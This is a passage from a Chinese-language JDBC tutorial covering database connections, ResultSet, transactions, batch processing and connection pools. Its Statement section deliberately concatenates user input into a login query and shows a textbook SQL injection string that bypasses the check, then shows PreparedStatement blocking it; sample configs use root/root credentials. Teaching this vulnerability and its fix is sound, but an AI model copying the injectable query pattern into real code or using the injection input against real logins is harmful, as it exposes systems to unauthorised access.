\"root\";\n        String password = \"root\";\n        //注册Driver驱动\n        DriverManager.registerDriver(driver);\n        Connection connection = DriverManager.getConnection(url, user, password);\n        System.out.println(\"第3种方式:\"+connection);\n    }\n\n    //方式4: 使用Class.forName 自动完成注册驱动，简化代码\n    @Test\n    public  void connect04() throws ClassNotFoundException, SQLException {\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        //创建url 和user 和password\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        String user = \"root\";\n        String password = \"root\";\n        Connection connection = DriverManager.getConnection(url, user, password);\n        System.out.println(\"第4种方式:\"+connection);\n    }\n    //方式5: 在方式4 的基础上改进，增加配置文件，让连接mysql 更加灵活\n    @Test\n    public  void connect05() throws ClassNotFoundException, SQLException, IOException {\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        String url = properties.getProperty(\"url\");\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        Class.forName(driver);//建议写上\n        Connection connection = DriverManager.getConnection(url, user, password);\n        System.out.println(\"第5种方式:\"+connection);\n    }\n}\n```\n\n### 3.ResultSet\n\n- 从数据库查询读取数据，返回的数据放在结果集中\n\n- ResultSet对象保持一个光标指向其当前的数据行。 最初， 光标位于第一行之前\n- next方法将光标移动到下一行，并且在ResultSet对象中没有更多行时返回false，因此可以在while循环中使用循环来遍历结果集\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\nimport java.sql.ResultSet;\n\npublic class ResultSet_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        //通过Properties 对象获取配置文件的信息\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //获取相关的值\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. 注册驱动\n        Class.forName(driver);//建议写上\n        //2. 得到连接\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. 得到Statement\n        Statement statement = connection.createStatement();\n        //4. 执行SQL\n        String sql = \"select id, name from jwt_info\";\n        ResultSet resultSet = statement.executeQuery(sql);//该语句返回单个ResultSet对象\n        //5. 使用while 取出数据\n        while (resultSet.next()) { // 让光标向后移动，如果没有更多行，则返回false\n            int id = resultSet.getInt(1); //通过索引获取该行的第1列\n            //String name = resultSet.getString(2);//通过索引获取该行的第2列\n            String name = resultSet.getString(\"name\");//通过列名获取该行的第2列\n            System.out.println(id + \"\\t\" + name + \"\\t\" );\n        }\n        //6. 关闭连接\n        resultSet.close();\n        statement.close();\n        connection.close();\n    }\n}\n```\n\n### 4.Statement\n\n- Statement对象用于执行静态SQL语句并返回其生成的结果的对象\n- Statement对象执行SQL语句，`存在SQL注入风险`\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\nimport java.util.Scanner;\n\npublic class Statement_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        Scanner scanner = new Scanner(System.in);\n        //让用户输入管理员名和密码\n        System.out.print(\"请输入管理员的名字: \"); //next(): 当接收到空格或者'就是表示结束\n        String admin_name = scanner.nextLine(); //如果希望看到SQL 注入，这里需要用nextLine\n        System.out.print(\"请输入管理员的密码: \");\n        String admin_pwd = scanner.nextLine();\n      \n        //通过Properties 对象获取配置文件的信息\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //获取相关的值\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. 注册驱动\n        Class.forName(driver);//建议写上\n        //2. 得到连接\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. 得到Statement\n        Statement statement = connection.createStatement();\n        //4. 组织SqL\n        String sql = \"select name , password from user where name ='\"\n                + admin_name + \"' and password = '\" + admin_pwd + \"'\";\n        ResultSet resultSet = statement.executeQuery(sql);\n        if (resultSet.next()) { //如果查询到一条记录，则说明该管理存在\n            System.out.println(\"恭喜， 登录成功\");\n        } else {\n            System.out.println(\"对不起，登录失败\");\n        }\n        //关闭连接\n        resultSet.close();\n        statement.close();\n        connection.close();\n    }\n}\n```\n\n正常登陆\n\n```bash\n请输入管理员的名字: Tom\n请输入管理员的密码: 123\n恭喜， 登录成功\n```\n\nSql注入登陆\n\n```bash\n请输入管理员的名字: Tom' or \n请输入管理员的密码: or '1'='1\n恭喜， 登录成功\n```\n\n### 5.PreparedStatement\n\n#### 简介\n\nPreparedStatement接口扩展了Statement接口，它添加了比Statement对象更好一些优点的功能。此语句可以动态地提供/接受参数。\n\n1. PreparedStatement执行的SQL语句中的参数用问号(?)来表示，\n2. 调用setXxx()方法来设置参数，setXxx()方法有两个参数，第一个参数是要设置的SQL语句中的参数的索引(从1开始)，第二个是设置的SQL语句中的参数的值\n3. 调用executeQuery()，执行查询，返回ResultSet对象\n4. 调用executeUpdate()，执行更新(增、删、改)，返回受影响的行数\n\n**预处理的好处**\n\n- 不再使用+拼接sql语句，减少语法错误\n- 有效的解决了sql注入问题！\n- 大大减少了编译次数，效率较高\n\n#### 执行查询\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\nimport java.util.Scanner;\n\npublic class PreparedStatement_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        Scanner scanner = new Scanner(System.in);\n        //让用户输入管理员名和密码\n        System.out.print(\"请输入管理员的名字: \"); //next(): 当接收到空格或者'就是表示结束\n        String admin_name = scanner.nextLine(); //如果希望看到SQL注入，这里需要用nextLine\n        System.out.print(\"请输入管理员的密码: \");\n        String admin_pwd = scanner.nextLine();\n        //通过Properties对象获取配置文件的信息\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //获取相关的值\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. 注册驱动\n        Class.forName(driver);//建议写上\n        //2. 得到连接\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. 得到PreparedStatement\n        //3.1 组织SqL , Sql 语句的? 就相当于占位符\n        String sql = \"select name , password from user where name = ? and password = ?\";\n        //3.2 preparedStatement 对象实现了PreparedStatement 接口的实现类的对象\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //3.3 给?赋值\n        preparedStatement.setString(1, admin_name);\n        preparedStatement.setString(2, admin_pwd);\n        //4. 执行select 语句使用executeQuery\n        // 如果执行的是dml(update, insert ,delete)使用executeUpdate()\n        // 这里执行executeQuery ,不要在写sql\n        ResultSet resultSet = preparedStatement.executeQuery();\n        if (resultSet.next()) { //如果查询到一条记录，则说明该管理存在\n            System.out.println(\"恭喜， 登录成功\");\n        } else {\n            System.out.println(\"对不起，登录失败\");\n        }\n        //关闭连接\n        resultSet.close();\n        preparedStatement.close();\n        connection.close();\n    }\n}\n```\n\n正常登陆\n\n```bash\n请输入管理员的名字: Tom\n请输入管理员的密码: 123\n恭喜， 登录成功\n```\n\nSql注入登陆\n\n```bash\n请输入管理员的名字: Tom' or\n请输入管理员的密码: or '1'='1\n对不起，登录失败\n```\n\n#### 执行更新\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\nimport java.util.Scanner;\n\npublic class PreparedStatement_ {\n    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {\n        Scanner scanner = new Scanner(System.in);\n        //让用户输入管理员名和密码\n        System.out.print(\"请输入管理员的名字: \"); //next(): 当接收到空格或者'就是表示结束\n        String admin_name = scanner.nextLine(); //如果希望看到SQL 注入，这里需要用nextLine\n        System.out.print(\"请输入管理员的密码: \");\n        String admin_pwd = scanner.nextLine();\n        //通过Properties 对象获取配置文件的信息\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //获取相关的值\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        String url = properties.getProperty(\"url\");\n        //1. 注册驱动\n        Class.forName(driver);//建议写上\n        //2. 得到连接\n        Connection connection = DriverManager.getConnection(url, user, password);\n        //3. 得到PreparedStatement\n        //3.1 组织SqL , Sql 语句的? 就相当于占位符\n        String sql = \"insert into user values (?,?)\";\n        //3.2 preparedStatement 对象实现了PreparedStatement 接口的实现类的对象\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //3.3 给?赋值\n        preparedStatement.setString(1, admin_name);\n        preparedStatement.setString(2, admin_pwd);\n        //4. 执行dml(update, insert ,delete),使用executeUpdate()\n        int rows = preparedStatement.executeUpdate();//不要写sql\n        System.out.println(rows > 0 ? \"执行成功\" : \"执行失败\");\n        //关闭连接\n        preparedStatement.close();\n        connection.close();\n    }\n}\n```\n\n### 6.JDBC API\n\n#### DriverManger驱动管理类\n\n- getConnection(url, user,pwd) 获取到连接\n\n#### Connection接口\n\n- createStatement() 创建Statement对象\n- PreparedStatement(sql) 生成预处理对象\n\n#### Statement接口\n\n- executeUpdate(sql) 执行dml语句，返回受影响的行数\n- executeQurey(sql) 执行查询，返回Resultset对象\n- execute(sql) 执行任意sql，返回布尔值\n\n#### PreparedStatement接口\n\n- executeUpdate() 执行dml语句，返回受影响的行数\n- executeQurey() 执行查询，返回Resultset对象\n- execute() 执行任意sql，返回布尔值\n- setXxx(占位符索引，占位符的值) 将值绑定到参数，解决sql注入\n- setObject占位符索引，占位符的值)\n\n#### ResultSet 结果集\n\n- next() 向下移动一行，如果没有下一行返回false\n- Previous() 向上移动一行\n- getXxx(列的索引｜列名) 返回对应列的值，接收类型为Xxx\n- getObject(列的索引｜列名) 返回对应列的值，接收类型为Object\n\n### 7.封装JDBCUtils\n\n#### 代码实现\n\n在JDBC操作时，**获取连接**和**释放连接**会经常使用，可以将其封装到JDBC连接的工具类JDBCUtils\n\n```java\npackage com.jwt.jdbc;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.*;\nimport java.util.Properties;\n\npublic class JDBCUtils {\n    //定义相关的属性(4 个), 因为只需要一份，因此，我们做出static\n    private static String user; //用户名\n    private static String password; //密码\n    private static String url; //url\n    private static String driver; //驱动名\n\n    //在static 代码块去初始化\n    static {\n        try {\n            Properties properties = new Properties();\n            properties.load(new FileInputStream(\"src//mysql.properties\"));\n            //读取相关的属性值\n            user = properties.getProperty(\"user\");\n            password = properties.getProperty(\"password\");\n            url = properties.getProperty(\"url\");\n            driver = properties.getProperty(\"driver\");\n        } catch (IOException e) {\n            //在实际开发中，我们可以这样处理\n            //1. 将编译异常转成运行异常\n            //2. 调用者，可以选择捕获该异常，也可以选择默认处理该异常，比较方便.\n            throw new RuntimeException(e);\n        }\n    }\n\n    //连接数据库, 返回Connection\n    public static Connection getConnection() {\n        try {\n            return DriverManager.getConnection(url, user, password);\n        } catch (SQLException e) {\n            //1. 将编译异常转成运行异常\n            //2. 调用者，可以选择捕获该异常，也可以选择默认处理该异常，比较方便.\n            throw new RuntimeException(e);\n        }\n    }\n\n    //关闭相关资源\n    /*\n    1. ResultSet 结果集\n    2. Statement 或者 PreparedStatement\n    3. Connection\n    4. 如果需要关闭资源，就传入对象，否则传入null\n    */\n    public static void close(ResultSet set, Statement statement, Connection connection) {\n        //判断是否为null\n        try {\n            if (set != null) {\n                set.close();\n            }\n            if (statement != null) {\n                statement.close();\n            }\n            if (connection != null) {\n                connection.close();\n            }\n        } catch (SQLException e) {\n            //将编译异常转成运行异常抛出\n            throw new RuntimeException(e);\n        }\n    }\n\n}\n```\n\n#### 使用工具类JDBCUtils进行DML\n\n```java\npackage com.jwt.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCUtils_Use {\n    @Test\n    public void testDML() {//insert , update, delete\n        //1. 得到连接\n        Connection connection = null;\n        //2. 组织一个sql\n        String sql = \"update user set name = ? where id = ?\";\n        PreparedStatement preparedStatement = null;\n        //3. 创建PreparedStatement 对象\n        try {\n            connection = JDBCUtils.getConnection();\n            preparedStatement = connection.prepareStatement(sql);\n            //给占位符赋值\n            preparedStatement.setString(1, \"Bob\");\n            preparedStatement.setInt(2, 1);\n            //执行\n            preparedStatement.executeUpdate();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //关闭资源\n            JDBCUtils.close(null, preparedStatement, connection);\n        }\n    }\n}\n\n```\n\n#### 使用工具类JDBCUtils进行Query\n\n```java\npackage com.jwt.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCUtils_Use {\n    @Test\n    public void testSelect() throws SQLException {\n        //1. 得到连接\n        Connection connection = null;\n        //2. 组织一个sql\n        String sql = \"select * from user where id = ?\";\n        PreparedStatement preparedStatement = null;\n        ResultSet set = null;\n        //3. 创建PreparedStatement 对象\n        try {\n            connection = JDBCUtils.getConnection();\n//            System.out.println(connection.getClass()); //com.mysql.jdbc.JDBC4Connection\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.setInt(1, 1);//给?号赋值\n            //执行, 得到结果集\n            set = preparedStatement.executeQuery();\n            //遍历该结果集\n            while (set.next()) {\n                int id = set.getInt(\"id\");\n                String name = set.getString(\"name\");\n                String password = set.getString(\"password\");\n                Date birthday = set.getDate(\"birthday\");\n                System.out.println(id + \"\\t\" + name + \"\\t\"  + password + \"\\t\" + birthday);\n            }\n        }catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //关闭资源\n            JDBCUtils.close(set, preparedStatement, connection);\n        }\n    }\n}\n```\n\n### 8.事务\n\n1. JDBC 程序中当一个 Connection 对象创建时，默认情况下是**自动提交事务**:每次执行一个 SQL 语句时，如果执行成功，就会向数据库**自动提交**，而不能回滚。\n2. JDBC 程序中为了让多个 SQL 语句作为一个整体执行，需要使用事务\n3. 调用 Connection 的 setAutoCommit(false) 可以取消自动提交事务\n4. 在所有的 SQL 语询都成功执行后，调用 Connection 的 commit(); 方法提交事务\n5. 在其中某个操作失败或出现异常时， 调用 Connection 的 rolback(); 方法回滚事务\n\n#### 模拟经典的转账业务\n\n```sql\ncreate table account(\n  id int primary key auto_ increment,\n  name varchar(32) not null default '',\n  balance double not null default 0) character set utf8;\n  \ninsert into account values(null, '马云', 3000);\ninsert into account values(null, '马化腾', 10000);\n```\n\n\n\n```java\npackage com.jwt.jdbc.transaction_;\n\nimport com.jwt.jdbc.JDBCUtils;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\n\npublic class Transaction_ {\n\n    //没有使用事务，100会凭空消失\n    @Test\n    public void noTransaction(){\n        //1. 得到连接\n        Connection connection = null;\n        //2. 组织一个sql\n        String sql = \"update account set balance = balance - 100 where id = 1\";\n        String sql2 = \"update account set balance = balance + 100 where id = 2\";\n        PreparedStatement preparedStatement = null;\n        //3. 创建PreparedStatement 对象\n        try {\n            connection = JDBCUtils.getConnection();// 在默认情况下，connection 是默认自动提交\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.executeUpdate();// 执行第1条sql\n\n            int i = 1 / 0; //抛出异常\n            preparedStatement = connection.prepareStatement(sql2);\n            preparedStatement.executeUpdate(); // 执行第2条sql\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //关闭资源\n            JDBCUtils.close(null, preparedStatement, connection);\n        }\n    }\n\n    //事务来解决\n    @Test\n    public void useTransaction() {\n        //1. 得到连接\n        Connection connection = null;\n        //2. 组织一个sql\n        String sql = \"update account set balance = balance - 100 where id = 1\";\n        String sql2 = \"update account set balance = balance + 100 where id = 2\";\n        PreparedStatement preparedStatement = null;\n        //3. 创建PreparedStatement 对象\n        try {\n            connection = JDBCUtils.getConnection();// 在默认情况下，connection 是默认自动提交\n            //将connection 设置为不自动提交\n            connection.setAutoCommit(false); //开启了事务\n\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.executeUpdate();// 执行第1条sql\n\n//            int i = 1 / 0; //抛出异常\n            preparedStatement = connection.prepareStatement(sql2);\n            preparedStatement.executeUpdate(); // 执行第2条sql\n\n            connection.commit();\n\n        } catch (SQLException e) {\n\n            try {\n                //这里我们可以进行回滚，即撤销执行的SQL\n                //默认回滚到事务开始的状态.\n                System.out.println(\"执行发生了异常，撤销执行的sql\");\n                connection.rollback();\n            } catch (SQLException ex) {\n                ex.printStackTrace();\n            }\n            e.printStackTrace();\n        } finally {\n            //关闭资源\n            JDBCUtils.close(null, preparedStatement, connection);\n        }\n\n    }\n\n}\n```\n\n### 9.批处理\n\n基本介绍\n1、当需要成批插入或者更新记录时。 可以采用Java的批量更新机制，这一机制允许多条语句一次性提交给数据库批量处理。通常情况下比单独提交处理更有效率。\n2、JDBC的批量处理语句包括下面方法:\n\n- addBatch():添加需要批量处理的SQL语包或参数\n- executeBatch():执行批量处理语句\n- clearBatch():清空批处理包的语句\n\n3、JDBC连接MySQL时， 如果要使用批处理功能，请再url中加参数**?rewriteBatchedStatements=true**\n\n4、批处理往往和PreparedStatement一搭配使用，可以既减少编译次数，又减少运行次数，效率大大提高\n\n```java\npackage com.jwt.jdbc;\n\nimport org.junit.Test;\n\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.util.Properties;\n\npublic class Batch_ {\n    //传统方法，添加5000 条数据到admin2\n    @Test\n    public void noBatch() throws Exception {\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));//windows路径的//改成\\\\\n        //获取相关的值\n        String url = properties.getProperty(\"url\");\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        Connection connection = DriverManager.getConnection(url,user,password);\n        String sql = \"insert into jwt_info values(?, ?)\";\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        System.out.println(\"开始执行\");\n        long start = System.currentTimeMillis();//开始时间\n        for (int i = 0; i < 5000; i++) {//5000 执行\n            preparedStatement.setInt(1, i);\n            preparedStatement.setString(2, \"jack\" + i);\n            preparedStatement.executeUpdate();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"传统的方式耗时=\" + (end - start) + \"ms\") ;//传统的方式耗时=385ms\n        //关闭连接\n        preparedStatement.close();\n        connection.close();\n    }\n\n    //使用批量方式添加数据\n    @Test\n    public void batch() throws Exception {\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));//windows路径的//改成\\\\\n        //获取相关的值\n        String url = properties.getProperty(\"url\");\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String driver = properties.getProperty(\"driver\");\n        Connection connection = DriverManager.getConnection(url,user,password);\n        String sql = \"insert into jwt_info values(?, ?)\";\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        System.out.println(\"开始执行\");\n        long start = System.currentTimeMillis();//开始时间\n        for (int i = 0; i < 5000; i++) {//5000 执行\n            preparedStatement.setInt(1, i);\n            preparedStatement.setString(2, \"jack\" + i);\n            preparedStatement.addBatch();\n            //当有1000 条记录时，在批量执行\n            if((i + 1) % 1000 == 0) {//满1000 条sql\n                preparedStatement.executeBatch();\n                //清空一把\n                preparedStatement.clearBatch();\n            }\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"批量方式耗时=\" + (end - start) + \"ms\");//批量方式耗时=60ms\n        //关闭连接\n        preparedStatement.close();\n        connection.close();\n        }\n}\n```\n\n### 10.数据库连接池\n\n#### 传统连接弊端\n\n- 1.传统的 JDBC 数据库连接使用 DriverManager 来获取，每次向数据库建立连接的时候都要将 Connection 加载到内存中，再验证 IP 地址，用户名和密码 (0.05s ~ 1s时间)。需要数据库连接的时候，就向数据库要求一个，频繁的进行数据库连接操作将占用很多的系统资源，容易造成服务器崩溃。\n- 2.每次数据库连接，使用完后都得断开，如果程序出现异常而未能关闭，将导致数据库内存泄漏，最终将导致重启数据库。\n- 3.传统获取连接的方式，不能控制创建的连接数量，如连接过多，也可能导致内存泄漏，MySQL崩溃。\n\n为了解决传统开发中的数据库连接问题，可以采用数据库连接池技术(connection pool)\n\n#### 连接池介绍\n\n- 1.预先在缓冲池中放入一定数量的连接， 当需要建立数据库连接时，只需从“缓冲池”中取出一个，使用完毕之后再放回去。\n- 2.数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是重新建立一个。\n- 3.当应用程序向连接池请求的连接数超过最大连接数量时，这些请求将被加入到等待队列中\n\n![](https://img.jwt1399.top/img/image-20220220161330174.png)\n\n#### 连接池种类\n\n- 1.JDBC 的数据库连接池使用 javax.sql.DataSource来表示，DataSource只是一个接口，该接口通常由第三方提供实现\n- 2.C3P0数据库连接池，速度相对较慢，稳定性不错。\n- 3.DBCP数据库连接池， 速度相对C3P0较快，但不稳定。\n- 4.Proxool数据库连接池，有监控连接池状态的功能，稳定性较c3p0差一点。\n- 5.BoneCP数据库连接池，速度快。\n- 6.Druid(德鲁伊)是阿里提供的数据库连接池，集DBCP、C3PO 、Proxool优点于一身的数据库连接池。\n\n#### C3P0\n\n##### 准备工作\n\n方式一和二都需要：\n\n将下载的 c3p0.jar 驱动拷贝到 libs 目录下，在 IDEA 中右键点击 c3p0.jar 选择 add to Library (加入到项目中)\n\n方式二还需要：\n\n将c3p0提供的 c3p0.config.xml 拷贝到 src 目录下，该文件指定了连接数据库和连接池的相关参数\n\n##### 方式一\n\n在程序中指定 user, url , password 等相关参数来完成\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.mchange.v2.c3p0.ComboPooledDataSource;\nimport org.junit.Test;\n\nimport java.beans.PropertyVetoException;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.Properties;\n\n\npublic class C3P0_ {\n\n    //方式1：在程序中指定 user, url , password 等相关参数\n    @Test\n    public void testC3P0_01() throws IOException, PropertyVetoException, SQLException {\n        //1. 创建一个数据源对象\n        ComboPooledDataSource comboPooledDataSource = new ComboPooledDataSource();\n        //2. 通过配置文件mysql.properties 获取相关连接的信息\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//mysql.properties\"));\n        //读取相关的属性值\n        String user = properties.getProperty(\"user\");\n        String password = properties.getProperty(\"password\");\n        String url = properties.getProperty(\"url\");\n        String driver = properties.getProperty(\"driver\");\n        //给数据源comboPooledDataSource 设置相关的参数\n        //注意：连接管理是由comboPooledDataSource 来管理\n        comboPooledDataSource.setDriverClass(driver);\n        comboPooledDataSource.setJdbcUrl(url);\n        comboPooledDataSource.setUser(user);\n        comboPooledDataSource.setPassword(password);\n        //设置初始化连接数\n        comboPooledDataSource.setInitialPoolSize(10);\n        //最大连接数\n        comboPooledDataSource.setMaxPoolSize(50);\n        //测试连接池的效率, 测试对mysql 5000 次操作\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 50000; i++) {\n            Connection connection = comboPooledDataSource.getConnection();//这个方法就是从DataSource 接口实现的\n            //System.out.println(\"连接OK\");\n            connection.close();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"c3p0的第一种方式连接mysql 50000次耗时=\" + (end - start));\n        //c3p0的第一种方式连接mysql 5000次耗时=516\n    }\n}\n```\n\n##### 方式二\n\n使用配置文件模板来完成\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.mchange.v2.c3p0.ComboPooledDataSource;\nimport org.junit.Test;\n\nimport java.beans.PropertyVetoException;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.Properties;\n\npublic class C3P0_ {\n  \n  //方式2：使用配置文件模板来完成\n  @Test\n  public void testC3P0_02() throws SQLException {\n      ComboPooledDataSource comboPooledDataSource = new ComboPooledDataSource(\"jwt_c3p0\");\n      //测试连接池的效率, 测试对mysql 5000 次操作\n      long start = System.currentTimeMillis();\n      for (int i = 0; i < 50000; i++) {\n        Connection connection = comboPooledDataSource.getConnection();//这个方法就是从DataSource 接口实现的\n        //System.out.println(\"连接OK~\");\n        connection.close();\n      }\n      long end = System.currentTimeMillis();\n      System.out.println(\"c3p0的第二种方式连接mysql 50000次耗时=\" + (end - start));\n      //c3p0的第二种方式连接mysql 5000次耗时=512\n  }\n}\n```\n\n#### Druid(德鲁伊)\n\n##### **准备工作**\n\n- 1.加入Druid jar 包\n- 2.加入配置文件 druid.properties , 将该文件拷贝项目的 src 目录\n\n```properties\n#key=value\ndriverClassName=com.mysql.jdbc.Driver\nurl=jdbc:mysql://localhost:3306/jwt?rewriteBatchedStatements=true\n#url=jdbc:mysql://localhost:3306/jwt\nusername=root\npassword=root\n#initial connection Size\ninitialSize=10\n#min idle connecton size\nminIdle=5\n#max active connection size\nmaxActive=20\n#max wait time (5000 mil seconds)\nmaxWait=5000\n```\n\n##### 代码实现\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\nimport org.junit.Test;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.util.Properties;\n\npublic class Druid_ {\n    @Test\n    public  void testDruid() throws Exception {\n        //1. 创建Properties 对象, 读取配置文件\n        Properties properties = new Properties();\n        properties.load(new FileInputStream(\"src//druid.properties\"));\n        //2. 创建一个指定参数的数据库连接池, Druid 连接池\n        DataSource dataSource = DruidDataSourceFactory.createDataSource(properties);\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 50000; i++) {\n            Connection connection = dataSource.getConnection();\n            //System.out.println(connection.getClass());\n            //System.out.println(\"连接成功!\");\n            connection.close();\n        }\n        long end = System.currentTimeMillis();\n        System.out.println(\"Druid 连接池操作50000次 mysql 耗时=\" + (end - start));\n        //Druid 连接池操作50000次 mysql 耗时=329\n    }\n}\n```\n\n##### 将JDBCUtils改成Druid实现\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\n\npublic class JDBCUtilsByDruid {\n    private static DataSource ds;\n    //在静态代码块完成ds 初始化\n    static {\n        Properties properties = new Properties();\n        try {\n            properties.load(new FileInputStream(\"src//druid.properties\"));\n            ds = DruidDataSourceFactory.createDataSource(properties);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    //编写getConnection 方法\n    public static Connection getConnection() throws SQLException {\n        return ds.getConnection();\n    }\n    //关闭连接, 强调：在数据库连接池技术中，close 不是真的断掉连接\n    //而是把使用的Connection 对象放回连接池\n    public static void close(ResultSet resultSet, Statement statement, Connection connection) {\n        try {\n            if (resultSet != null) {\n                resultSet.close();\n            }\n            if (statement != null) {\n                statement.close();\n            }\n            if (connection != null) {\n                connection.close();\n            }\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n\n##### 使用JDBCUtilsByDruid进行Query\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCUtilsByDruid_Use {\n\n    @Test\n    public void testSelect() {\n        System.out.println(\"使用 druid 方式完成\");\n        //1. 得到连接\n        Connection connection = null;\n        //2. 组织一个sql\n        String sql = \"select * from user where id = ?\";\n        PreparedStatement preparedStatement = null;\n        ResultSet set = null;\n        //3. 创建PreparedStatement 对象\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            System.out.println(connection.getClass());//运行类型com.alibaba.druid.pool.DruidPooledConnection\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.setInt(1, 1);//给?号赋值\n            //执行, 得到结果集\n            set = preparedStatement.executeQuery();\n            //遍历该结果集\n            while (set.next()) {\n                int id = set.getInt(\"id\");\n                String name = set.getString(\"name\");\n                String password = set.getString(\"password\");\n                Date birthday = set.getDate(\"birthday\");\n                System.out.println(id + \"\\t\" + name + \"\\t\"  + password + \"\\t\" + birthday);\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //关闭资源\n            JDBCUtilsByDruid.close(set, preparedStatement, connection);\n        }\n    }\n}\n```\n\n###  11.Apache-DBUtils\n\n#### 问题引出\n\n- 1.关闭connection后, resultSet结果集无法使用\n- 2.resultSet不利于数据的管理\n\n#### 土方法来解决\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.junit.Test;\n\nimport java.sql.*;\nimport java.util.ArrayList;\n\npublic class JDBCUtilsByDruid_Use {\n\n    //使用老师的土方法来解决ResultSet =封装=> Arraylist\n    @Test\n    public void testSelectToArrayList() {\n        System.out.println(\"使用druid 方式完成\");\n        //1. 得到连接\n        Connection connection = null;\n        //2. 组织一个sql\n        String sql = \"select * from user where id >= ?\";\n        PreparedStatement preparedStatement = null;\n        ResultSet set = null;\n        ArrayList<User> list = new ArrayList<>();//创建ArrayList 对象,存放user对象\n        //3. 创建PreparedStatement 对象\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            